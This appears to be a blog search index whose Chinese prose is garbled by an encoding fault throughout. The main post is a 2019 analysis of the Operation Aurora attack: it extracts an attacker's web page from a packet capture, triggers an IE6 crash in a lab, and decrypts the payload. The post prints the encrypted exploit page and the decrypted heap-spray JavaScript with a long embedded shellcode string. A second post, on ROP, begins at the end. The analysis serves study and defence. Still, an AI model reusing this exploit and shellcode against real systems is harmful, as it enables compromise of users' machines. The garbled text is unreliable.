æ—¢ç„¶åªæœ‰æµé‡åŒ…ï¼Œé‚£å°±åªèƒ½ä»æµé‡åŒ…å…¥æ‰‹ã€‚åœ¨è¿™é‡Œéœ€è¦æé†’ä¸€å¥çš„æ˜¯ï¼Œå› ä¸ºè¿™ä¸ªæµé‡åŒ…æ˜¯æœ‰äººæ•…æ„åšçš„ä¸€ä¸ªæµé‡åŒ…ï¼Œæ‰€ä»¥è¿™ä¸ªæµé‡åŒ…æ˜¯æ¯”è¾ƒå¹²å‡€çš„ï¼Œä¹Ÿå°±æ˜¯é‡Œé¢å°±åªæœ‰ä¸è¿™ä¸ªæ¼æ´ç›¸å…³çš„æµé‡ï¼Œç›¸å¯¹æ¥è¯´åˆ†æèµ·æ¥è¾ƒä¸ºå®¹æ˜“ã€‚å¦‚æœæ˜¯åœ¨çœŸå®ç¯å¢ƒä¸­ï¼ŒæŠ“å–åˆ°æ•°æ®åŒ…å¯èƒ½æ˜¯æ‚ä¹±æ— ç« çš„ï¼Œè¿™æ ·çš„æƒ…å†µå°±å¾ˆè€ƒéªŒæµé‡åˆ†æçš„æŠ€æœ¯äº†ã€‚æˆ‘ä»¬è¿™é‡Œæ˜¯ä¸ºäº†åˆ†ææ¼æ´ï¼Œæ‰€ä»¥åªå¯¹æµé‡åšç®€å•åˆ†æå³å¯ã€‚ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.1 æµé‡çš„å¤§æ¦‚å†…å®¹ æ‰“å¼€æµé‡åŒ…ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªåŒ…ä¸­åªæœ‰HTTPå’ŒTCPä¸¤ç§ç±»å‹çš„æ•°æ®åŒ… ã€‚ æµé‡å¤§æ¦‚å†…å®¹\" æµé‡å¤§æ¦‚å†…å®¹ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:1","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.2 æŸ¥çœ‹åè®®åˆ†çº§ ä»åè®®åˆ†çº§ä¸­å¯ä»¥æŸ¥çœ‹åˆ°ï¼ŒTCPå’ŒHTTPåè®®å ç”¨äº†å¤§éƒ¨åˆ†çš„æ•°æ®åŒ… åè®®åˆ†çº§\" åè®®åˆ†çº§ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:2","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.3 æŸ¥çœ‹å¯¹è¯ ä»å¯¹è¯çª—å£å¯ä»¥çœ‹å‡ºåªæœ‰ä¸¤ä¸ªä¼šè¯ æŸ¥çœ‹å¯¹è¯\" æŸ¥çœ‹å¯¹è¯ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:3","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.4 è¿‡æ»¤å¯¹è¯ åœ¨å¯¹è¯çª—å£è®¾ç½®è¿‡æ»¤å™¨ è®¾ç½®è¿‡æ»¤å™¨\" è®¾ç½®è¿‡æ»¤å™¨ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:4","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.5 è¿½è¸ªæµ åœ¨è¿‡æ»¤åçš„æµé‡ä¸­ï¼Œé€‰æ‹©è¿½è¸ªæµï¼Œå¯ä»¥å°†å½“å‰æµé‡æ˜¾ç¤ºæˆå¯ç›´è§‚è§‚å¯Ÿçš„æµé‡ã€‚ä½†éœ€è¦æ³¨æ„ä¸€ç‚¹çš„æ˜¯ï¼šéœ€è¦æ ¹æ®å½“å‰è¿‡æ»¤çš„æ•°æ®åŒ…åè®®æ¥é€‰æ‹©è¿½è¸ªå“ªä¸ªæµï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œè¿‡æ»¤çš„TCPçš„åè®®ï¼Œé‚£ä¹ˆè¿½è¸ªæ—¶å°±è¿½è¸ªTCPæµã€‚å‡å¦‚è¿‡æ»¤æ˜¯å…¶ä»–åè®®ï¼Œä¾‹å¦‚HTTPåè®®ï¼Œå°±éœ€è¦é€‰æ‹©è¿½è¸ªHTTPæµ è¿½è¸ªTCPæµ\" è¿½è¸ªTCPæµ è¿‡æ»¤çš„æµé‡ä¸­æœ‰ä¸¤ä¸ªå®Œæ•´çš„æµï¼Œåˆ†åˆ«å¦‚ä¸‹ï¼š æµ0ï¼š è¿½è¸ªæµ0\" è¿½è¸ªæµ0 æµ1ï¼š è¿½è¸ªæµ1\" è¿½è¸ªæµ1 å¯ä»¥çœ‹åˆ°æµ0æ˜¯ä¸€ä¸ªè®¿é—®Webçš„å¯¹è¯ï¼Œæµ1åˆ™çœ‹ä¸Šå»åƒæ˜¯Windowså‘½ä»¤è¡Œä¸­æ‰§è¡Œäº†å‘½ä»¤ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:2:5","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"3. æå–æ ·æœ¬ é€šè¿‡ä¸Šé¢ä¸¤ä¸ªæµçš„å†…å®¹æ¥çœ‹ï¼Œå¯ä»¥çŒœæµ‹æ˜¯å—å®³è€…è®¿é—®äº†æ”»å‡»è€…çš„ç½‘é¡µï¼Œç„¶åæ”»å‡»è€…çš„ç½‘é¡µæ‰§è¡Œäº†Windowså‘½ä»¤(å¯¹æ”»å‡»æ¯”è¾ƒæ•æ„Ÿçš„è¯ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥äº†)ã€‚æ¥ä¸‹æ¥å°±éœ€è¦æå–å‡ºæ”»å‡»è€…çš„æ”»å‡»æ ·æœ¬ï¼Œç„¶åå¯¹æ­¤æ ·æœ¬è¿›è¡Œåˆ†æã€‚ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:3:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"3.1 å¯¹æµ0è¿›è¡Œåˆ†æ å¯¹æµ0çš„æµé‡è¿›è¡Œåˆ†æï¼Œå¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾åªæœ‰ä¸€ä¸ªç½‘é¡µè®¿é—®ï¼Œè¯¥ç½‘é¡µå¯èƒ½å°±æ˜¯æ”»å‡»è€…çš„æ¶æ„é¡µé¢ å¯¹æµ0çš„åˆ†æ\" å¯¹æµ0çš„åˆ†æ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:3:1","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"3.2 æå–æ ·æœ¬ æå–æ ·æœ¬\" æå–æ ·æœ¬ æœ€ç»ˆæå–å‡ºçš„ç½‘é¡µå†…å®¹æ˜¯è¿™æ ·çš„ï¼š \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\"\u003e \u003chtml\u003e \u003chead\u003e \u003cscript\u003e var IwpVuiFqihVySoJStwXmT = '04271477133b000b1a0c240339133c120e2805160e1503684d705005291a08091b3e6e713e1122520b03123d051808392c0d27123b0a0805033c1c0735321a2407350314142935250829083c0a0000072f142624011f2a27022825082f253f2c39394a716a2615275207142524357d43772c2702705a2f466a657c6e4a256a7450614176566c65257e4165310515150a0f2b35302a103d0e03041e0234362f3a3c34073e1b0d0d02131e3f1635200e21101c38093913112e322223211f3239302133381b330a0c2c1175576c2e2713251f2308236b2f270f2d3e2d353c172b03393164031d192b1e363c012f072d311538230f2e113979490b03123d051808392c0d27123b0a0805033c1c0735321a2407350314142935250829083c0a0000072f142624011f2a27022825082f253f2c39393125176614310627466a656e0d3a3968730d261334463b1122303b07052d3d3705303e36340f05131d0b2934142b070d33657175043926244b261334461d362b31063d3e00263e1c110f11080f250e340020150110220c1e111c3d0e273f3a3a21050f2b2208341f04042c684d701c231177043e270b3562614b26133446220e083e1c0d0e1b3d1d31362b271221170036001a240230092e222638383d152b1a23162b0d3330230b14053e3e3c1a321537122d27043a30271d2439383b121f160a033e1c211e383f203e3e143136190210081f2c1e231603112d363975576c3f261523112716327e2a20042f3e211f3e5221212e233d131c0f1318223d2a24080212361718392626070a24072c27102533210823092a15390917190d3e3310250d0c04053d04173d1c0f212b180820333c382d3e3d2036000921320a1c36371e4e7e3e3a34186c271f1707352e1f260a1a2d281c3b3c1e113411272e3d2419043d080611023c280d1c3318332b3b1c3d061f0b050810103b173a160f32230a060d16260216001c1c05684d70070d223c330d113901070b001d02110b152f361f3818180a3f180725123a121534381f0c113b05152021162a3e211e26282f012408242e381f27020605220124293309293c3321011a033a040822143533003f08000e22392c35270835137f656b701f2a727c4175077f5565726920537b782e55254b7f52366039610b75286d05364b7255723078305e2e6f3d49624b76432223746108693f7b47694063136423756c4f392c7d49695733526f7c7d701f75287b167507725f632369205e29797f5525417152616039315c78786d05644a720372302a6d592a6f3d44364b774322767b6153693f7c4164136313637c2a314f3973704966573355602328701f782b7c1175077f506e7469205e7b7e7a55254623526460396c08787d6d0569107f5672302a6d597b6f3d1669462743227129665d693f2e13364763136e762a364f397e29433657335460717f701f75727c16750722506e726920537b2c7d55254b7752646039615b78726d0536477f5672302a365e746f3d4436147f4322777b315c693f7c116245631331217e624f392c7d4963573300337174701f75727116750772076e7569205e742c7d5525467f00336039615375796d05644a74517230756d53756f3d43364b2443227c7d6c59693f2c46644a631331217f334f397e7a4469573354602328701f752c714075072002647269205e7d797f55254b7f5f6460396c5d78796d05364775517230756d5e7d6f3d493240714322767b6c59693f7141644063136e7475634f397e7044675733006f2374701f2a2e7c48750772556e776920592a73795525462452646039615a787d6d056942200572307566592a6f3d496840714322777b610c693f7c4963456313637575674f397e794236573352357c7d701f2a727b16750772506e7c69205e7b7e7155254b705f6660396c5378736d056442725772307567592a6f3d42674b754322717f3352693f7c41694a6313317d756c4f397370496957335260712d701f78737c407507725e6e7769205e297e7e55254b77003460393352787b6d05644a7f507230756d5e296f3d426714224322712a6c58693f71466941631363762a6d4f39732e16655733006f7c7f701f2a2e2c4675072250637c69205e2d7e7e5525467f5f666039330e75726d0564452250723075375e7f6f3d16684b754322712e3353693f7c15644b6313632478634f397e7b446857330062717c701f787971487507750063276920537c7e7e55254624556060396158787b6d0563457f5f7230756c5e2a6f3d44314b714322232f6c5a693f7c1163146313637c75374f39797f496357335231767b701f782b711275077400637c69205e7c7e7b55254b2052656039610b2a726d056245725672302a3153756f3d166514224322767b615d693f7c4069406313647278624f39737b146657335f6f717a701f757c714975077500652369205e7b2c70552514255f6660396c5d75286d053647205e723028635e7b6f3d4463147f4322717f615d693f7c11634563133126786d4f397378423657335f352328701f78737c4275077451317c6920587b73795525467e5f316039615975726d0564417f5672307564537f6f3d49694171432223796c58693f7c49644063136e7378374f397379496357335f65772a701f75787c1275077551637d6920582a732a5525417154316039615b78286d056945725772302a36","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:3:2","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4. éªŒè¯æ ·æœ¬ ä»ä¸Šé¢çš„æ ·æœ¬å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€å¤§å †çš„ä¹±ä¸ƒå…«ç³Ÿçš„JavaScriptä»£ç ï¼Œå¦‚æœæ‡‚JavaScriptçš„è¯å¯ä»¥ç›´æ¥å¯¹ä»£ç è¿›è¡Œåˆ†æã€‚æˆ‘è¿™é‡Œä¸å¤ªæ‡‚JavaScriptï¼Œæ‰€ä»¥æˆ‘æ˜¯ç›´æ¥æ­å»ºçš„ç¯å¢ƒï¼Œç„¶åç”¨IE6.0è¿›è¡Œæµ‹è¯•ã€‚ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.1 ç¯å¢ƒæ­å»º æ­å»ºä¸€ä¸ªWebæœåŠ¡å™¨ï¼Œå°†æ¶æ„ç½‘é¡µæ”¾åœ¨index.htmlä¸­ï¼Œæ¨¡æ‹Ÿæ”»å‡»è€… ç¯å¢ƒæ­å»º\" ç¯å¢ƒæ­å»º ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:1","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.2 æ¨¡æ‹Ÿå—å®³è€… æ¨¡æ‹Ÿå—å®³è€…ï¼Œä½¿ç”¨IE6.0è®¿é—®æ¶æ„ç½‘é¡µ è®¿é—®æ¶æ„ç½‘é¡µ\" è®¿é—®æ¶æ„ç½‘é¡µ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:2","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.3 ä»£ç ç®€å•åˆ†æ ä½¿ç”¨IE6.0è®¿é—®äº†æ¶æ„ç½‘é¡µä¹‹åï¼Œå¹¶æ²¡æœ‰ä»»ä½•ååº”ï¼Œä»ç›´è§‰ä¸Šæˆ‘æ„Ÿè§‰æ²¡æœ‰è§¦å‘æ¼æ´ï¼Œåº”è¯¥æ˜¯å“ªé‡Œæé”™äº†ã€‚ç®€å•åˆ†æäº†ä¸‹è¿™ä¸ªJavaScriptä»£ç ï¼Œå¦‚ä¸‹ï¼š ä»£ç åˆ†æ\" ä»£ç åˆ†æ ä»ä¸Šé¢åˆ†æä¸­å¯ä»¥å¾—çŸ¥ï¼Œè¿™ä¸ªæ¶æ„è„šæœ¬è·å–äº†è®¿é—®URLçš„å‚æ•°ï¼Œæ‰€ä»¥å¯èƒ½åŠ ä¸Šå‚æ•°æ‰èƒ½è§¦å‘æ¼æ´ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:3","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.4 å¯»æ‰¾å‚æ•° åœ¨åˆšæ‰çš„è¿½è¸ªæµä¸­å¯»æ‰¾å‚æ•° å¯»æ‰¾å‚æ•°\" å¯»æ‰¾å‚æ•° å¯ä»¥çœ‹åˆ°åœ¨è®¿é—®æ¶æ„ç½‘é¡µçš„æ—¶å€™çš„ç¡®æœ‰å‚æ•°ï¼šrFfWELUjLJHpP ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:4","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.5 è§¦å‘æ¼æ´ é‡æ–°åŠ ä¸Šå‚æ•°è®¿é—®æ¶æ„ç½‘é¡µ è§¦å‘æ¼æ´\" è§¦å‘æ¼æ´ å¯ä»¥çœ‹åˆ°ï¼Œåœ¨åŠ ä¸Šå‚æ•°åè®¿é—®æå–å‡ºæ¥çš„é¡µé¢ï¼ŒIEå´©æºƒäº†ï¼Œè¯´æ˜æ­¤æ ·æœ¬æ˜¯å¯ä»¥è§¦å‘æ¼æ´çš„ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:4:5","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"5. è§£å¯†æ ·æœ¬ ä»ä¸Šé¢çš„æ“ä½œæ¥çœ‹ï¼Œå¾ˆæ˜æ˜¾æå–çš„ç½‘é¡µæ˜¯ä¸€ä¸ªåŠ å¯†Payloadï¼Œè€ŒURLåçš„å‚æ•°åˆ™æ˜¯è§£å¯†çš„å¯†é’¥ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦ç”¨å‚æ•°å°†åŠ å¯†Payloadç»™è§£å¯†å‡ºæ¥ã€‚ å¦‚ä½•è§£å¯†æ ·æœ¬å‘¢ï¼Ÿæˆ‘çš„æ€è·¯æ˜¯åœ¨ä»£ç è§£å¯†åã€ä»£ç æ‰§è¡Œå‰ï¼Œå°†è§£å¯†å‡ºæ¥çš„å†…å®¹ä¿å­˜æˆæ–‡ä»¶ã€‚å…¶å®ä¹Ÿä¸ç”¨è¿™ä¹ˆéº»çƒ¦ï¼Œç›´æ¥è¾“å‡ºè§£å¯†åçš„å†…å®¹ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸è¿‡å½“æ—¶æ²¡æœ‰è¿™ä¹ˆåšã€‚å¯¹æ¶æ„é¡µé¢è¿›è¡Œä¿®æ”¹åï¼Œå¦‚ä¸‹ï¼š ä¿®æ”¹é¡µé¢\" ä¿®æ”¹é¡µé¢ ä¿®æ”¹äº†ä¹‹åå†å¸¦ä¸Šå‚æ•°è¿›è¡Œè®¿é—®å³å¯å¾—åˆ°è§£å¯†åçš„å†…å®¹ å¾—åˆ°è§£å¯†æ ·æœ¬\" å¾—åˆ°è§£å¯†æ ·æœ¬ è§£å¯†åçš„Payloadå¦‚ä¸‹ï¼š è§£å¯†åçš„Payload\" è§£å¯†åçš„Payload å°†å…¶è¿›è¡Œç¾åŒ–ï¼Œå°±å¾—åˆ°è§£å¯†åçš„JavaScriptä»£ç ï¼š var VwUaVFlsiaztYmICdYI = \"COMMENT\"; var MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul = new Array(); for (i = 0; i \u003c 1300; i++) { MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul[i] = document.createElement(VwUaVFlsiaztYmICdYI); MeExIMbufEWBILnRFpImyxRTWGErClypbeBtzPrAICchTufmJXuziChiul[i].data = \"XPu\"; } var lTneQKOeMgwvXaqCPyQAaDDYAkd = null; var JsgdlqtHVnnWiFMCpdxJheQbdjITPhdkurJqwIMuMxJnHf = new Array(); var uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu = unescape; function gGyfqFvCYPRmXbnUWzBrulnwZVAJpUifKDiAZEKOqNHrfziGDtUOBqjYCtATBhClJkXjezUcmxBlfEX() { var mWgWGhyqOVxBPqtnAFWAyxhLnqBNaRNnkKvTfAwVuvOyCnGUwBPZEzSZtKpqGZUvPO = uKDkvADSMMCpMpWmBjzJRTRBOHuctmWYaRSFYKUgfGAorttjbgqtzbHoZkWlIhITyAOOkvmTpOpLxrfsUWzDUdnsdEwzsu('%uf841%u9327%u972f%u994a%u4a9b%uf943%u4e4b%u9290%uf84b%u3792%u3f99%uf599%u4891%u9b3f%u494f%u4e37%u3746%ud642%u484e%uf83f%u4f91%u3749%u414a%u49fd%u9896%u37fd%u4a4a%u9691%u4742%u4e43%u9b47%u9b90%uf837%uf94a%u4e37%ufcf5%u93fc%u4a3f%u2743%u984f%ud697%u97f5%u9143%u4148%uf590%ufc48%u4ff9%u27d6%u4a27%ufd27%uf593%ufd48%u989f%u4a90%u48f5%u49fd%u4993%u4827%u9899%u3f9b%u9193%ud648%ufd3f%u4249%u27fd%u9f90%ufd37%u4137%u9993%u9743%uf537%u9841%u9b27%u3793%u9142%u9196%u4847%uf8f8%ufd48%u4392%u3f91%u4b43%u4047%u90fc%u933f%u9827%u274f%u4937%u4092%u412f%u4b91%uf83f%u4699%u4749%u9691%u9949%u4041%u923f%u2793%u43f8%u4198%uf899%u9899%u474a%u4940%u4892%u4e46%u91fc%uf841%u4896%u984e%u27fd%u4f92%u9693%u43f8%u9ff5%uf893%ufdd6%ud649%u4a46%u4991%ufd98%u47d6%u9b43%uf893%u4bf9%u4e49%u4a46%u4348%uf540%u4398%u3f4b%u9046%u4b37%u4241%u3799%u994f%u4a97%ufc90%u4a3f%u499b%u3793%u4f37%u4a9b%u2f49%u4043%u9f42%u4af8%u2740%ufd99%uf5fd%u3747%u4092%u3747%u93d6%u9846%u9699%u3f2f%u47f8%ufc91%u979b%uf5f8%ud647%u43f9%u4347%u4a37%ufc48%u902f%u9bfd%u4942%u27f9%u2791%u489f%u4398%u4390%u9193%u9937%uf592%u4942%u964b%u9193%u922f%u924b%u3748%u2f9b%u372f%u414b%u9741%ufcf9%u49f9%ud6f5%u91fc%u4643%u41fd%uf893%u3727%u4b93%u2f27%u909f%u4847%u49fd%u972f%ufd41%u479b%u3742%u48f8%u9146%u43d6%u9b27%u41fd%u9348%u2742%u3796%uf8f9%ufd49%u3f90%u9690%u9096%uf5fd%u2f99%u98fd%ufdfd%u432f%u96d6%u9342%ufc42%u4a98%u4e42%u9243%u4727%u939b%u47fd%u4193%u4a3f%u3f91%u929b%u9149%uf9f8%uf59b%u4849%u409b%u9796%u4b4f%u9797%uf548%u9041%u4948%u9141%u2743%u46f5%u3799%uf549%u9292%uf592%u4392%u9049%uf949%u4092%u4090%u3ff9%u4afd%u2f49%u4243%u4697%u9697%u9747%u434e%u92f8%u4741%u37f8%u9b2f%u46d6%u3791%ufd97%u489f%ud693%u2f96%u3797%u41fc%uf892%ufc93%ud699%u4792%u419b%u3f4b%u4f90%u9bfd%u493f%ufdf5%uf541%u439f%uf9f5%u909b%u4b99%u9093%ufd91%u2746%u989f%u4942%u97f8%u4897%u473f%u9337%ufc3f%uf9fd%u4e2f%u42f8%uf92f%u9690%u9096%u49d6%u9f9f%u9098%u9040%uf991%u4b27%u9f91%u4a48%u48f8%u3f43%u9937%u41d6%u994a%u424b%u4b96%u9146%u48f8%uf893%u472f%u982f%u4991%u4241%u9b42%u469b%u423f%u4f4e%u9792%u9296%ubf98%ua70b%u4afb%ud8db%uc929%u74d9%uf424%u4bb1%u315a%u127a%uea83%u03fc%ua971%ubf19%u7104%ub289%u85f9%udbce%u7a8c%u1c2f%uf3ee%u2dca%u673c%u1c9e%ue3f0%uacf2%ua17b%u27e6%u6e09%u8f08%u48a7%u1027%u5506%ud2eb%u2909%u06f6%u10e9%u5b39%u55e8%u9424%u0eb8%u0722%u3a2c%u9476%uec4d%ua4fc%u8935%u51c3%u908f%uc913%udb84%u618b%ufbc2%ua6aa%uc711%uc3e5%ub3e1%u05f7%u3b38%u69c6%u0296%u67e6%u43e7%u97c1%ubf92%u2531%u7ba4%uf14b%u9e21%u72eb%u7a91%u560d%u0847%u1301%u560c%ua206%uecc1%u2f32%u22e4%u6bb3%ue6c2%u289f%ube6b%u9e45%ua094%u7f22%uaa30%u94c1%uf142%u598d%u0a78%uf64e%u790b%u597c%u15a7%u12cc%ue161%u0933%u7dd5%ub2ca%u5725%ue609%ucf75%u87b8%u0f1e%u5244%u5fb0%u0dea%u3070%ufe4a%u5a18%u2145%u6538%u4a8f%u9fd2%ub558%uc48a%u5d52%u04c8%u7f73%ue245%u6f19%ubc03%u16b5%u360e%ud627%u3285%u5c67%uc229%u9526%ud044%u55df%u8a13%u6976%ua18e%uff76%u6034%u9720%u5536%u3806%ub0c9%uf11c%u7b5f%ufe4b%u7b8f%u","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:5:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"6. END è¿™æ¬¡æµé‡åˆ†æ+æ ·æœ¬æå–ï¼Œæˆ‘ç®—æ˜¯çŸ¥é“äº†å¦‚ä½•å»æ•è·åˆ«äººçš„æ”»å‡»ã€ä»¥åŠæ ¹æ®åˆ«äººçš„æ”»å‡»æµé‡æå–å‡ºæœ€å…³é”®çš„expï¼Œæ„Ÿè§‰åœ¨è¿™ç§æµé‡æ•è·+åˆ†æä¸­ï¼Œä»»ä½•åŠ å¯†çš„expéƒ½èƒ½è¢«æ•è·åˆ°ï¼Œç„¶åè‡ªå·±å†åˆ†æå¹¶åˆ©ç”¨ï¼Œçœ‹æ¥expä¹Ÿä¸èƒ½éšä¾¿ç”¨ï¼Œä½ ä¹Ÿä¸çŸ¥é“å¯¹é¢æ˜¯å¦å¼€äº†æµé‡ç›‘æ§ç­‰ç€ä½ å»æ”»å‡»ã€‚ å‚è€ƒé“¾æ¥ exabeam æå…‰è¡ŒåŠ¨ä»‹ç»ï¼šhttps://www.exabeam.com/information-security/operation-aurora/ js æŠŠå­—ç¬¦ä¸²ä¿å­˜ä¸ºtxtæ–‡ä»¶ï¼Œå¹¶ä¸‹è½½åˆ°æœ¬åœ°ï¼šhttps://www.cnblogs.com/hill-foryou/p/js.html jsç¾åŒ–ï¼šhttps://tool.lu/js/ æµé‡åŒ…ä¸‹è½½ï¼šhttps://meta.box.lenovo.com/link/view/d3040d279acd4d789d9efb84d94ef6cf å¯†ç ï¼š1f84 å‚è€ƒä¹¦ç± ã€ŠWiresharkæ•°æ®åŒ…åˆ†æå®æˆ˜ ç¬¬3ç‰ˆã€‹ [ç¾]å…‹é‡Œæ–¯Â·æ¡‘å¾·æ–¯ï¼ˆChris Sandersï¼‰è‘—ï¼Œè¯¸è‘›å»ºä¼Ÿã€é™†å®‡ç¿”ã€æ›¾çš“è¾° è¯‘ï¼Œäººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾ï¼ŒISBN: 9787115494313ï¼Œè±†ç“£é“¾æ¥ ","date":"2019-06-08","objectID":"/2019/06/aurora-analysis-1/:6:0","tags":["æ¼æ´åˆ†æ"],"title":"æå…‰è¡ŒåŠ¨æ¼æ´åˆ†æ-æå–æ ·æœ¬","uri":"/2019/06/aurora-analysis-1/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"ROPåˆä½“éªŒ","date":"2019-06-02","objectID":"/2019/06/first-rop/","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"1. ROP ä»‹ç» ä»‹ç»ROPä¹‹å‰ï¼Œä¹Ÿå…ˆä»‹ç»ä¸‹DEP å¼•ç”¨ æ•°æ®æ‰§è¡Œä¿æŠ¤ (DEP) æ˜¯ä¸€å¥—è½¯ç¡¬ä»¶æŠ€æœ¯ï¼Œèƒ½å¤Ÿåœ¨å†…å­˜ä¸Šæ‰§è¡Œé¢å¤–æ£€æŸ¥ä»¥é˜²æ­¢åœ¨ä¸å¯è¿è¡Œçš„å†…å­˜åŒºåŸŸä¸Šæ‰§è¡Œä»£ç ï¼Œåœ¨è¿™æ ·çš„å†…å­˜ç©ºé—´ä¸­ï¼Œå³ä½¿å‡ºç°äº†æº¢å‡ºæƒ…å†µï¼Œå †æ ˆä¹Ÿæ˜¯ä¸å¯æ‰§è¡Œçš„ã€‚ ROPï¼ŒRetrun-oriented Programmming(é¢å‘è¿”å›çš„ç¼–ç¨‹)ï¼Œæ˜¯ä¸€ç§å¯ç»•è¿‡DEPçš„æ–¹æ³•ã€‚æŠ€æœ¯åŸç†å°±æ˜¯é€šè¿‡æ„é€ 